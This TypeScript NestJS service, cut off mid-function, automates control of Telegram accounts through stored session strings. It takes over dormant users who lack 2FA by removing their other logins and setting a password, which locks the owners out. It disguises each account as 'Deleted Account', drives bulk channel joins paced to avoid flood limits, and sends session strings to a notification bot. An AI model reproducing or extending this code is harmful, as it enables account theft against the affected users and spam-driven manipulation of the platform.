import { ChannelsService } from './../channels/channels.service';
import { Channel } from './../channels/schemas/channel.schema';
import {
    BadRequestException, ConflictException, HttpException, Inject, Injectable,
    InternalServerErrorException, Logger, NotFoundException, forwardRef, OnModuleDestroy
} from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import { CreateBufferClientDto } from './dto/create-buffer-client.dto';
import { BufferClient, BufferClientDocument } from './schemas/buffer-client.schema';
import { TelegramService } from '../Telegram/Telegram.service';
import { sleep } from 'telegram/Helpers';
import { UsersService } from '../users/users.service';
import { ActiveChannelsService } from '../active-channels/active-channels.service';
import { ClientService } from '../clients/client.service';
import { UpdateBufferClientDto } from './dto/update-buffer-client.dto';
import { PromoteClientService } from '../promote-clients/promote-client.service';
import { parseError } from '../../utils/parseError';
import { fetchWithTimeout } from '../../utils/fetchWithTimeout';
import { notifbot } from '../../utils/logbots';
import { connectionManager } from '../Telegram/utils/connection-manager';
import { SessionService } from '../session-manager';
import { contains } from '../../utils';

@Injectable()
export class BufferClientService implements OnModuleDestroy {
    private readonly logger = new Logger(BufferClientService.name);
    private joinChannelMap: Map<string, Channel[]> = new Map();
    private joinChannelIntervalId: NodeJS.Timeout | null = null;
    private leaveChannelMap: Map<string, string[]> = new Map();
    private leaveChannelIntervalId: NodeJS.Timeout | null = null;
    private isJoinChannelProcessing: boolean = false;
    private isLeaveChannelProcessing: boolean = false;

    // Track all timeouts for proper cleanup
    private activeTimeouts: Set<NodeJS.Timeout> = new Set();

    // Fixed constant values to match comments
    private readonly JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000; // 4 minutes
    private readonly LEAVE_CHANNEL_INTERVAL = 60 * 1000; // 60 seconds
    private readonly LEAVE_CHANNEL_BATCH_SIZE = 10;
    private readonly CLIENT_PROCESSING_DELAY = 5000; // 5 seconds between clients
    private readonly CHANNEL_PROCESSING_DELAY = 10000; // 10 seconds between channel operations

    // Memory management constants
    private readonly MAX_MAP_SIZE = 100; // Prevent unbounded Map growth
    private readonly CLEANUP_INTERVAL = 10 * 60 * 1000; // 10 minutes
    private cleanupIntervalId: NodeJS.Timeout | null = null;

    constructor(@InjectModel('bufferClientModule') private bufferClientModel: Model<BufferClientDocument>,
        @Inject(forwardRef(() => TelegramService))
        private telegramService: TelegramService,
        @Inject(forwardRef(() => UsersService))
        private usersService: UsersService,
        @Inject(forwardRef(() => ActiveChannelsService))
        private activeChannelsService: ActiveChannelsService,
        @Inject(forwardRef(() => ClientService))
        private clientService: ClientService,
        @Inject(forwardRef(() => ChannelsService))
        private channelsService: ChannelsService,
        @Inject(forwardRef(() => PromoteClientService))
        private promoteClientService: PromoteClientService,
        @Inject(forwardRef(() => SessionService))
        private sessionService: SessionService
    ) {
        // Start periodic memory cleanup
        this.startMemoryCleanup();
    }

    async onModuleDestroy() {
        this.logger.log('Cleaning up BufferClientService resources');
        await this.cleanup();
    }

    private async cleanup(): Promise<void> {
        try {
            // Clear all timeouts
            this.clearAllTimeouts();

            // Clear intervals
            this.clearJoinChannelInterval();
            this.clearLeaveChannelInterval();
            this.clearMemoryCleanup();

            // Clear maps
            this.clearBufferMap();
            this.clearLeaveMap();

            // Reset processing flags
            this.isJoinChannelProcessing = false;
            this.isLeaveChannelProcessing = false;

            this.logger.log('BufferClientService cleanup completed');
        } catch (error) {
            this.logger.error('Error during cleanup:', error);
        }
    }

    private startMemoryCleanup(): void {
        this.cleanupIntervalId = setInterval(() => {
            this.performMemoryCleanup();
        }, this.CLEANUP_INTERVAL);

        this.activeTimeouts.add(this.cleanupIntervalId);
    }

    private clearMemoryCleanup(): void {
        if (this.cleanupIntervalId) {
            clearInterval(this.cleanupIntervalId);
            this.activeTimeouts.delete(this.cleanupIntervalId);
            this.cleanupIntervalId = null;
        }
    }

    private performMemoryCleanup(): void {
        try {
            // Clean up empty entries in joinChannelMap
            for (const [mobile, channels] of this.joinChannelMap.entries()) {
                if (!channels || channels.length === 0) {
                    console.log(`Cleaning up joinChannelMap entry for mobile: ${mobile} as channels : ${channels}`);
                    this.joinChannelMap.delete(mobile);
                }
            }

            // Clean up empty entries in leaveChannelMap
            for (const [mobile, channels] of this.leaveChannelMap.entries()) {
                if (!channels || channels.length === 0) {
                    console.log(`Cleaning up leaveChannelMap entry for mobile: ${mobile} as channels : ${channels}`);
                    this.leaveChannelMap.delete(mobile);
                }
            }

            // Prevent Map growth beyond reasonable limits
            if (this.joinChannelMap.size > this.MAX_MAP_SIZE) {
                const keysToRemove = Array.from(this.joinChannelMap.keys()).slice(this.MAX_MAP_SIZE);
                keysToRemove.forEach(key => this.joinChannelMap.delete(key));
                this.logger.warn(`Cleaned up ${keysToRemove.length} entries from joinChannelMap to prevent memory leak`);
            }

            if (this.leaveChannelMap.size > this.MAX_MAP_SIZE) {
                const keysToRemove = Array.from(this.leaveChannelMap.keys()).slice(this.MAX_MAP_SIZE);
                keysToRemove.forEach(key => this.leaveChannelMap.delete(key));
                this.logger.warn(`Cleaned up ${keysToRemove.length} entries from leaveChannelMap to prevent memory leak`);
            }

            this.logger.debug(`Map Memory Check completed. Maps sizes - Join: ${this.joinChannelMap.size}, Leave: ${this.leaveChannelMap.size}, Active timeouts: ${this.activeTimeouts.size}`);
        } catch (error) {
            this.logger.error('Error during memory cleanup:', error);
        }
    }

    private createTimeout(callback: () => void, delay: number): NodeJS.Timeout {
        const timeout = setTimeout(() => {
            this.activeTimeouts.delete(timeout);
            callback();
        }, delay);
        this.activeTimeouts.add(timeout);
        return timeout;
    }

    private clearAllTimeouts(): void {
        this.activeTimeouts.forEach(timeout => {
            clearTimeout(timeout);
        });
        this.activeTimeouts.clear();
        this.logger.debug('Cleared all active timeouts');
    }

    private checkMemoryHealth(): void {
        const memoryStats = {
            joinMapSize: this.joinChannelMap.size,
            leaveMapSize: this.leaveChannelMap.size,
            activeTimeouts: this.activeTimeouts.size,
            isJoinProcessing: this.isJoinChannelProcessing,
            isLeaveProcessing: this.isLeaveChannelProcessing
        };

        this.logger.debug('Memory health check:', memoryStats);

        // Emergency cleanup if memory usage is too high
        if (memoryStats.joinMapSize > this.MAX_MAP_SIZE * 0.9) {
            this.logger.warn('Join map approaching memory limit, performing emergency cleanup');
            this.performMemoryCleanup();
        }

        if (memoryStats.leaveMapSize > this.MAX_MAP_SIZE * 0.9) {
            this.logger.warn('Leave map approaching memory limit, performing emergency cleanup');
            this.performMemoryCleanup();
        }
    }

    async create(bufferClient: CreateBufferClientDto): Promise<BufferClient> {
        // Ensure status is set to 'active' by default if not provided
        const newUser = new this.bufferClientModel({
            ...bufferClient,
            status: bufferClient.status || 'active',
        });
        return newUser.save();
    }


    async findAll(status?: 'active' | 'inactive'): Promise<BufferClient[]> {
        const filter = status ? { status } : {};
        return this.bufferClientModel.find(filter).exec();
    }

    async findOne(mobile: string, throwErr: boolean = true): Promise<BufferClient> {
        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user && throwErr) {
            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return user;
    }


    async update(mobile: string, updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {
        // Allow updating status as well
        const updatedUser = await this.bufferClientModel.findOneAndUpdate(
            { mobile },
            { $set: updateClientDto },
            { new: true, upsert: true, returnDocument: 'after' }
        ).exec();

        if (!updatedUser) {
            throw new NotFoundException(`User with mobile ${mobile} not found`);
        }

        return updatedUser;
    }

    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreateBufferClientDto | UpdateBufferClientDto): Promise<BufferClient> {
        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            console.log("Updating")
            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdateBufferClientDto);
        } else {
            console.log("creating")
            // Ensure status is set to 'active' by default if not provided
            return this.create({ ...createOrUpdateUserDto, status: (createOrUpdateUserDto as any).status || 'active' } as CreateBufferClientDto);
        }
    }

    async remove(mobile: string): Promise<void> {
        try {
            const bufferClient = await this.findOne(mobile, false);
            if (!bufferClient) {
                throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);
            }
            this.logger.log(`Removing BufferClient with mobile: ${mobile}`);
            await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}\nsession: ${bufferClient.session}`)}`);
            await this.bufferClientModel.deleteOne({ mobile }).exec();
        } catch (error) {
            const errorDetails = parseError(error);
            this.logger.error(`Error removing BufferClient with mobile ${mobile}: ${errorDetails.message}`);
            throw new HttpException(errorDetails.message, errorDetails.status);
        }
        this.logger.log(`BufferClient with mobile ${mobile} removed successfully`);
    }
    async search(filter: any): Promise<BufferClient[]> {
        // Allow filtering by status
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }
        }
        if (filter.status) {
            filter.status = filter.status;
        }
        return this.bufferClientModel.find(filter).exec();
    }

    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<BufferClient[]> {
        try {

            if (!query) {
                throw new BadRequestException('Query is invalid.');
            }
            const queryExec = this.bufferClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }

            if (limit) {
                queryExec.limit(limit);
            }

            if (skip) {
                queryExec.skip(skip);
            }

            return await queryExec.exec();
        } catch (error) {
            throw new InternalServerErrorException(error.message);
        }
    }

    removeFromBufferMap(key: string) {
        this.joinChannelMap.delete(key);
    }

    private safeSetJoinChannelMap(mobile: string, channels: Channel[]): boolean {
        if (this.joinChannelMap.size >= this.MAX_MAP_SIZE && !this.joinChannelMap.has(mobile)) {
            this.logger.warn(`Join channel map size limit reached (${this.MAX_MAP_SIZE}), cannot add ${mobile}`);
            return false;
        }
        this.joinChannelMap.set(mobile, channels);
        return true;
    }

    private safeSetLeaveChannelMap(mobile: string, channels: string[]): boolean {
        if (this.leaveChannelMap.size >= this.MAX_MAP_SIZE && !this.leaveChannelMap.has(mobile)) {
            this.logger.warn(`Leave channel map size limit reached (${this.MAX_MAP_SIZE}), cannot add ${mobile}`);
            return false;
        }
        this.leaveChannelMap.set(mobile, channels);
        return true;
    }

    clearBufferMap() {
        const mapSize = this.joinChannelMap.size;
        this.joinChannelMap.clear();
        this.clearJoinChannelInterval();
        this.logger.debug(`BufferMap cleared, removed ${mapSize} entries`);
    }


    async updateStatus(mobile: string, status: string, message?: string): Promise<BufferClient> {
        const updateData: any = { status };
        if (message) {
            updateData.message = message;
        }

        return this.update(mobile, updateData);
    }

    async markAsInactive(mobile: string, reason: string): Promise<BufferClient> {
        return this.updateStatus(mobile, 'inactive', reason);
    }

    async updateInfo() {
        const clients = await this.bufferClientModel.find({
            status: 'active'
        }).sort({ channels: 1 });

        this.logger.debug(`Updating info for ${clients.length} buffer clients`);

        for (let i = 0; i < clients.length; i++) {
            const client = clients[i];
            const mobile = client.mobile;

            try {
                this.logger.debug(`Updating info for client ${i + 1}/${clients.length}: ${mobile}`);

                // Add delay before getting client
                await sleep(2000);
                const telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });

                await sleep(1500); // Delay before channel info call
                const channels = await telegramClient.channelInfo(true);
                this.logger.debug(`${mobile}: Found ${channels.ids.length} existing channels`);

                await sleep(1000); // Delay before update
                await this.update(mobile, { channels: channels.ids.length });

            } catch (error) {
                const errorDetails = parseError(error);
                try {
                    await this.markAsInactive(mobile, `${errorDetails.message}`);
                } catch (markError) {
                    this.logger.error(`Error marking client ${mobile} as inactive:`, markError);
                }
                this.logger.error(`Error updating info for client ${mobile}:`, errorDetails);
            } finally {
                try {
                    await connectionManager.unregisterClient(mobile);
                } catch (unregisterError) {
                    this.logger.error(`Error unregistering client ${mobile}:`, unregisterError);
                }

                // Add delay between client processing
                if (i < clients.length - 1) {
                    await sleep(4000); // 4 seconds between each client
                }
            }
        }

        this.logger.debug('Completed updating info for all buffer clients');
    }

    async joinchannelForBufferClients(skipExisting: boolean = true): Promise<string> {
        if (this.telegramService.getActiveClientSetup()) {
            this.logger.warn('Ignored active check buffer channels as active client setup exists');
            return 'Active client setup exists, skipping buffer promotion';
        }

        this.logger.log('Starting join channel process for buffer clients');

        this.joinChannelMap.clear();
        this.leaveChannelMap.clear();
        this.clearJoinChannelInterval();
        this.clearLeaveChannelInterval();
        await sleep(3000); // Increased initial sleep

        const existingKeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());
        const clients = await this.bufferClientModel.find({
            channels: { $lt: 350 },
            mobile: { $nin: existingKeys }
        }).sort({ channels: 1 }).limit(8); // Reduced limit for better performance

        this.logger.debug(`Found ${clients.length} buffer clients to process`);

        const joinSet = new Set<string>();
        const leaveSet = new Set<string>();

        let successCount = 0;
        let failCount = 0;

        // Sequential processing with proper delays
        for (let i = 0; i < clients.length; i++) {
            const document = clients[i];
            const mobile = document.mobile;
            this.logger.debug(`Processing buffer client ${i + 1}/${clients.length}: ${mobile}`);

            try {
                const client = await connectionManager.getClient(mobile, {
                    autoDisconnect: false,
                    handler: false
                });

                // Add delay before channel info call
                await sleep(2000);
                const channels = await client.channelInfo(true);
                this.logger.debug(`Client ${mobile} has ${channels.ids.length} existing channels`);
                await this.update(mobile, { channels: channels.ids.length });

                if (channels.canSendFalseCount < 10) {
                    const excludedIds = channels.ids;
                    const result = channels.ids.length < 220
                        ? await this.channelsService.getActiveChannels(150, 0, excludedIds) // Reduced limit
                        : await this.activeChannelsService.getActiveChannels(150, 0, excludedIds);

                    if (!this.joinChannelMap.has(mobile)) {
                        if (this.safeSetJoinChannelMap(mobile, result)) {
                            joinSet.add(mobile);
                            this.logger.debug(`Added ${result.length} channels to join queue for ${mobile}`);
                        } else {
                            this.logger.warn(`Failed to add ${mobile} to join queue due to memory limits`);
                        }
                    } else {
                        this.logger.debug(`${mobile}: Already present in join map, skipping`);
                    }

                } else {
                    if (!this.leaveChannelMap.has(mobile)) {
                        if (this.safeSetLeaveChannelMap(mobile, channels.canSendFalseChats)) {
                            leaveSet.add(mobile);
                            this.logger.warn(`Client ${mobile} has ${channels.canSendFalseChats.length} restricted channels, added to leave queue`);
                        } else {
                            this.logger.warn(`Failed to add ${mobile} to leave queue due to memory limits`);
                        }
                    } else {
                        this.logger.debug(`${mobile}: Already present in leave map, skipping`);
                    }
                }

                successCount++;

            } catch (error) {
                failCount++;

                const errorDetails = parseError(error);
                const errorMsg = errorDetails?.message || error?.errorMessage || 'Unknown error';

                if (contains(errorMsg, [
                    "SESSION_REVOKED",
                    "AUTH_KEY_UNREGISTERED",
                    "USER_DEACTIVATED",
                    "USER_DEACTIVATED_BAN",
                    "FROZEN_METHOD_INVALID"
                ])) {
                    this.logger.error(`Session invalid for ${mobile} due to ${errorMsg}, removing client`);
                    try {
                        await this.remove(mobile);
                        await sleep(2000); // Delay after removal
                    } catch (removeErr) {
                        this.logger.error(`Failed to remove client ${mobile}:`, removeErr);
                    }
                } else {
                    this.logger.warn(`Transient error for ${mobile}: ${errorMsg}`);
                }
            } finally {
                try {
                    await connectionManager.unregisterClient(mobile);
                } catch (unregisterError) {
                    this.logger.error(`Error unregistering client ${mobile}:`, unregisterError);
                }

                // Progressive delay between clients to prevent CPU spikes
                if (i < clients.length - 1) {
                    await sleep(this.CLIENT_PROCESSING_DELAY);
                }
            }
        }

        // Add delay before starting queues
        await sleep(3000);

        if (joinSet.size > 0) {
            this.logger.debug(`Starting join queue for ${joinSet.size} buffer clients`);
            this.createTimeout(() => this.joinChannelQueue(), 2000); // Delayed start
        }

        if (leaveSet.size > 0) {
            this.logger.debug(`Starting leave queue for ${leaveSet.size} buffer clients`);
            this.createTimeout(() => this.leaveChannelQueue(), 5000); // Delayed start
        }

        this.logger.log(`Join process complete — Success: ${successCount}, Fail: ${failCount}`);
        return `Buffer Join queued for: ${joinSet.size}, Leave queued for: ${leaveSet.size}`;
    }

    async joinChannelQueue() {
        this.logger.debug('Attempting to start join channel queue');
        if (this.isJoinChannelProcessing) {
            this.logger.warn('Join channel process is already running');
            return;
        }

        const existingKeys = Array.from(this.joinChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to join, not starting queue');
            return;
        }

        // Perform memory health check
        this.checkMemoryHealth();

        this.isJoinChannelProcessing = true;

        try {
            await this.processJoinChannelSequentially();
        } catch (error) {
            this.logger.error('Error in join channel queue', error);
        } finally {
            this.isJoinChannelProcessing = false;

            // Schedule next run if there are still items to process
            if (this.joinChannelMap.size > 0) {
                this.logger.debug('Scheduling next join channel process');
                this.createTimeout(() => {
                    this.joinChannelQueue();
                }, this.JOIN_CHANNEL_INTERVAL);
            }
        }
    }

    private async processJoinChannelSequentially() {
        const keys = Array.from(this.joinChannelMap.keys());
        this.logger.debug(`Processing join channel queue sequentially for ${keys.length} clients`);

        for (let i = 0; i < keys.length; i++) {
            const mobile = keys[i];
            let currentChannel: Channel | null = null;

            try {
                const channels = this.joinChannelMap.get(mobile);
                if (!channels || channels.length === 0) {
                    this.logger.debug(`No more channels to join for ${mobile}, removing from queue`);
                    this.removeFromBufferMap(mobile);
                    continue;
                }

                currentChannel = channels.shift();
                this.logger.debug(`${mobile} has ${channels.length} pending channels to join, processing: @${currentChannel.username}`);
                this.joinChannelMap.set(mobile, channels);
                await this.telegramService.tryJoiningChannel(mobile, currentChannel);
            } catch (error: any) {
                const errorDetails = parseError(error, `${mobile} ${currentChannel ? `@${currentChannel.username}` : ''} Join Channel Error: `, false);
                this.logger.error(`Error joining channel for ${mobile}: ${error.message}`);

                if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {
                    this.logger.warn(`${mobile} has FloodWaitError or joined too many channels, removing from queue`);
                    this.removeFromBufferMap(mobile);

                    try {
                        await sleep(2000);
                        const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);
                        await this.update(mobile, { channels: channelsInfo.ids.length });
                    } catch (updateError) {
                        this.logger.error(`Error updating channel count for ${mobile}:`, updateError);
                    }
                }

                if (contains(errorDetails.message, [
                    "SESSION_REVOKED",
                    "AUTH_KEY_UNREGISTERED",
                    "USER_DEACTIVATED",
                    "USER_DEACTIVATED_BAN",
                    "FROZEN_METHOD_INVALID"
                ])) {
                    this.logger.error(`Session invalid for ${mobile}, removing client`);
                    this.removeFromBufferMap(mobile);
                    try {
                        await this.remove(mobile);
                        await sleep(2000);
                    } catch (removeError) {
                        this.logger.error(`Error removing client ${mobile}:`, removeError);
                    }
                }

            } finally {
                try {
                    await connectionManager.unregisterClient(mobile);
                } catch (unregisterError) {
                    this.logger.error(`Error unregistering client ${mobile}:`, unregisterError);
                }

                // Add delay between channel processing operations
                if (i < keys.length - 1 || this.joinChannelMap.get(mobile)?.length > 0) {
                    console.log(`Sleeping for ${this.CHANNEL_PROCESSING_DELAY} before continuing with next Mobile`)
                    await sleep(this.CHANNEL_PROCESSING_DELAY);
                } else {
                    console.log(`Not Sleeping before continuing with next Mobile`)
                }
            }
        }
    }

    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            this.logger.debug(`Clearing join channel interval: ${this.joinChannelIntervalId}`);
            clearInterval(this.joinChannelIntervalId);
            this.activeTimeouts.delete(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
        }
        this.isJoinChannelProcessing = false;
        this.logger.debug('Join channel processing cleared and flag reset');
    }

    removeFromLeaveMap(key: string) {
        this.leaveChannelMap.delete(key);
        if (this.leaveChannelMap.size === 0) {
            this.clearLeaveChannelInterval();
        }
    }

    clearLeaveMap() {
        const mapSize = this.leaveChannelMap.size;
        this.leaveChannelMap.clear();
        this.clearLeaveChannelInterval();
        this.logger.debug(`LeaveMap cleared, removed ${mapSize} entries`);
    }

    async leaveChannelQueue() {
        this.logger.debug('Attempting to start leave channel queue');
        if (this.isLeaveChannelProcessing) {
            this.logger.warn('Leave channel process is already running');
            return;
        }

        const existingKeys = Array.from(this.leaveChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to leave, not starting queue');
            return;
        }

        // Perform memory health check
        this.checkMemoryHealth();

        this.isLeaveChannelProcessing = true;

        try {
            await this.processLeaveChannelSequentially();
        } catch (error) {
            this.logger.error('Error in leave channel queue', error);
        } finally {
            this.isLeaveChannelProcessing = false;

            // Schedule next run if there are still items to process
            if (this.leaveChannelMap.size > 0) {
                this.logger.debug('Scheduling next leave channel process');
                this.createTimeout(() => {
                    this.leaveChannelQueue();
                }, this.LEAVE_CHANNEL_INTERVAL);
            }
        }
    }

    private async processLeaveChannelSequentially() {
        const keys = Array.from(this.leaveChannelMap.keys());
        this.logger.debug(`Processing leave channel queue sequentially for ${keys.length} clients`);

        for (let i = 0; i < keys.length; i++) {
            const mobile = keys[i];

            try {
                const channels = this.leaveChannelMap.get(mobile);
                if (!channels || channels.length === 0) {
                    this.logger.debug(`No more channels to leave for ${mobile}, removing from queue`);
                    this.removeFromLeaveMap(mobile);
                    continue;
                }

                // Process smaller batches sequentially
                const channelsToProcess = channels.splice(0, this.LEAVE_CHANNEL_BATCH_SIZE);
                this.logger.debug(`${mobile} has ${channels.length} pending channels to leave, processing ${channelsToProcess.length} channels`);

                // Only update map if there are remaining channels
                if (channels.length > 0) {
                    this.leaveChannelMap.set(mobile, channels);
                } else {
                    this.removeFromLeaveMap(mobile);
                }

                // Add delay before getting client
                await sleep(2000);
                const client = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });

                this.logger.debug(`${mobile} attempting to leave ${channelsToProcess.length} channels`);

                // Add delay before leaving channels
                await sleep(1500);
                await client.leaveChannels(channelsToProcess);

                this.logger.debug(`${mobile} left ${channelsToProcess.length} channels successfully`);

            } catch (error: any) {
                const errorDetails = parseError(error, `${mobile} Leave Channel ERR: `, false);

                if (contains(errorDetails.message, [
                    "SESSION_REVOKED",
                    "AUTH_KEY_UNREGISTERED",
                    "USER_DEACTIVATED",
                    "USER_DEACTIVATED_BAN",
                    "FROZEN_METHOD_INVALID"
                ])) {
                    this.logger.error(`Session invalid for ${mobile}, removing client`);
                    try {
                        await this.remove(mobile);
                        await sleep(2000);
                    } catch (removeError) {
                        this.logger.error(`Error removing client ${mobile}:`, removeError);
                    }
                    this.removeFromLeaveMap(mobile);
                } else {
                    this.logger.warn(`Transient error for ${mobile}: ${errorDetails.message}`);
                }

            } finally {
                try {
                    await connectionManager.unregisterClient(mobile);
                } catch (unregisterError) {
                    this.logger.error(`Error unregistering client ${mobile}: ${unregisterError.message}`);
                }

                // Add delay between leave operations
                if (i < keys.length - 1 || this.leaveChannelMap.get(mobile)?.length > 0) {
                    await sleep(this.LEAVE_CHANNEL_INTERVAL / 2); // Half the interval as delay
                }
            }
        }
    }

    clearLeaveChannelInterval() {
        if (this.leaveChannelIntervalId) {
            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);
            clearInterval(this.leaveChannelIntervalId);
            this.activeTimeouts.delete(this.leaveChannelIntervalId);
            this.leaveChannelIntervalId = null;
        }
        this.isLeaveChannelProcessing = false;
        this.logger.debug('Leave channel interval cleared and processing flag reset');
    }

    async setAsBufferClient(
        mobile: string,
        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]
    ) {
        const user = (await this.usersService.search({ mobile }))[0];
        if (!user) {
            throw new BadRequestException('user not found');
        }
        const isExist = await this.findOne(mobile, false)
        if (isExist) {
            throw new ConflictException('BufferClient already exist');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map(client => client?.mobile);

        // Get promote mobiles using the new schema
        const allPromoteMobiles = [];
        for (const client of clients) {
            const clientPromoteMobiles = await this.clientService.getPromoteMobiles(client.clientId);
            allPromoteMobiles.push(...clientPromoteMobiles);
        }

        if (!allPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {
            try {
                const telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false })
                await telegramClient.set2fa();
                await sleep(15000)
                await telegramClient.updateUsername('');
                await sleep(3000)
                await telegramClient.updatePrivacyforDeletedAccount();
                await sleep(3000)
                await telegramClient.updateProfile("Deleted Account", "Deleted Account");
                await sleep(3000)
                await telegramClient.deleteProfilePhotos();
                const channels = await this.telegramService.getChannelInfo(mobile, true)
                const bufferClient = {
                    tgId: user.tgId,
                    session: user.session,
                    mobile: user.mobile,
                    availableDate,
                    channels: channels.ids.length,
                    status: 'active',
                };
                await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();
            } catch (error) {
                const errorDetails = parseError(error)
                throw new HttpException(errorDetails.message, errorDetails.status)
            }
            await connectionManager.unregisterClient(mobile)
            return "Client set as buffer successfully";
        } else {
            throw new BadRequestException("Number is a Active Client")
        }
    }

    async checkBufferClients() {
        if (this.telegramService.getActiveClientSetup()) {
            this.logger.warn("Ignored active check buffer channels as active client setup exists");
            return;
        }

        await sleep(3000); // Increased initial delay
        const bufferclients = await this.findAll('active');
        const badIds: string[] = [];
        let goodIds: string[] = [];

        if (bufferclients.length < 80) {
            for (let i = 0; i < 80 - bufferclients.length; i++) {
                badIds.push(i.toString());
            }
        }

        const clients = await this.clientService.findAll();
        const promoteclients = await this.promoteClientService.findAll();

        // Get all client mobiles including promote mobiles using new schema
        const clientMainMobiles = clients.map(c => c.mobile);
        const allPromoteMobiles = [];
        for (const client of clients) {
            const clientPromoteMobiles = await this.clientService.getPromoteMobiles(client.clientId);
            allPromoteMobiles.push(...clientPromoteMobiles);
        }
        const clientIds = [...clientMainMobiles, ...allPromoteMobiles].filter(Boolean);

        const promoteclientIds = promoteclients.map(c => c.mobile);

        const toProcess = bufferclients.filter(doc =>
            !clientIds.includes(doc.mobile) &&
            !promoteclientIds.includes(doc.mobile)
        );

        // Sequential processing instead of parallel
        this.logger.debug(`Processing ${toProcess.length} buffer clients sequentially`);
        for (let i = 0; i < toProcess.length; i++) {
            const doc = toProcess[i];
            this.logger.debug(`Processing buffer client ${i + 1}/${toProcess.length}: ${doc.mobile}`);

            try {
                await this.processBufferClient(doc, badIds, goodIds);
            } catch (error) {
                this.logger.error(`Error processing buffer client ${doc.mobile}:`, error);
                badIds.push(doc.mobile);
            }

            // Add delay between client processing
            if (i < toProcess.length - 1) {
                await sleep(5000); // 5 seconds between each client
            }
        }

        // Mark already active clients as good (sequential processing)
        for (let i = 0; i < bufferclients.length; i++) {
            const doc = bufferclients[i];
            if (clientIds.includes(doc.mobile) || promoteclientIds.includes(doc.mobile)) {
                this.logger.warn(`Number ${doc.mobile} is an Active Client`);
                goodIds.push(doc.mobile);
                try {
                    await this.remove(doc.mobile);
                    await sleep(1000); // Delay after removal
                } catch (removeError) {
                    this.logger.error(`Error removing active client ${doc.mobile}:`, removeError);
                }
            }
        }

        goodIds = [...new Set([...goodIds, ...clientIds, ...promoteclientIds])];
        this.logger.debug(`GoodIds: ${goodIds.length}, BadIds: ${badIds.length}`);

        // Add delay before processing new users
        await sleep(2000);
        await this.addNewUserstoBufferClients(badIds, goodIds);
    }

    private async processBufferClient(doc: any, badIds: string[], goodIds: string[]) {
        try {
            const cli = await connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });

            try {
                const me = await cli.getMe();

                if (me.username) {
                    await this.telegramService.updateUsername(doc.mobile, '');
                    await sleep(2000);
                }

                if (me.firstName !== "Deleted Account") {
                    await this.telegramService.updateNameandBio(doc.mobile, 'Deleted Account', '');
                    await sleep(2000);
                }

                await this.telegramService.deleteProfilePhotos(doc.mobile);
                const hasPassword = await cli.hasPassword();

                if (!hasPassword) {
                    this.logger.warn(`Client ${doc.mobile} does not have password`);
                    badIds.push(doc.mobile);
                } else {
                    this.logger.debug(`${doc.mobile}: ALL Good`);
                    goodIds.push(doc.mobile);
                }
            } catch (innerError: any) {
                this.logger.error(`Error processing client ${doc.mobile}: ${innerError.message}`);
                badIds.push(doc.mobile);
                try {
                    await this.remove(doc.mobile);
                    await sleep(1500); // Delay after removal
                } catch (removeError) {
                    this.logger.error(`Error removing client ${doc.mobile}:`, removeError);
                }
            } finally {
                try {
                    await connectionManager.unregisterClient(doc.mobile);
                } catch (unregisterError) {
                    this.logger.error(`Error unregistering client ${doc.mobile}: ${unregisterError.message}`);
                }
            }

            await sleep(3000); // Increased delay between individual client ops

        } catch (error: any) {
            this.logger.error(`Error with client ${doc.mobile}: ${error.message}`);
            parseError(error);
            badIds.push(doc.mobile);

            try {
                await this.remove(doc.mobile);
                await sleep(1500);
            } catch (removeError) {
                this.logger.error(`Error removing client ${doc.mobile}:`, removeError);
            }

            try {
                await connectionManager.unregisterClient(doc.mobile);
            } catch (unregisterError) {
                this.logger.error(`Error unregistering client ${doc.mobile}: ${unregisterError.message}`);
            }
        }
    }


    async addNewUserstoBufferClients(badIds: string[], goodIds: string[]) {
        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];
        const documents = await this.usersService.executeQuery(
            {
                mobile: { $nin: goodIds },
                expired: false,
                twoFA: false,
                lastActive: { $lt: sixMonthsAgo },
                totalChats: { $gt: 150 }
            },
            { tgId: 1 },
            badIds.length + 3
        );

        this.logger.debug(`New buffer documents to be added: ${documents.length}`);

        let processedCount = 0;
        while (badIds.length > 0 && documents.length > 0) {
            const document = documents.shift();
            processedCount++;

            if (!document || !document.mobile || !document.tgId || !document.session) {
                this.logger.warn('Invalid document found, skipping');
                continue;
            }

            this.logger.debug(`Processing new buffer client ${processedCount}: ${document.mobile}`);

            try {
                const client = await connectionManager.getClient(document.mobile, { autoDisconnect: false });

                try {
                    const hasPassword = await client.hasPassword();
                    this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);

                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        this.logger.debug("Waiting for setting 2FA");
                        await sleep(30000);

